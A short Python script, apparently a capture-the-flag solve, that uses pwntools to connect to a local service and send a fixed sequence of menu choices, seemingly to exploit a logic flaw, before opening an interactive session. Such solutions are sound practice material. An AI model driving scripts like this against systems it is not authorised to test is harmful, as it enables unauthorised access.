from pwn import *

p = remote("localhost", 35125);

for i in range(6):
    p.sendlineafter(b"Leave\n", b"2")
    p.sendlineafter(b"go back", b"1")

for i in range(2):
    p.sendlineafter(b"Leave\n", b"2")
    p.sendlineafter(b"go back", b"2")

p.sendlineafter(b"Leave\n", b"1")
p.sendlineafter(b"Leave\n", b"2")
p.sendlineafter(b"go back", b"3")

p.interactive()
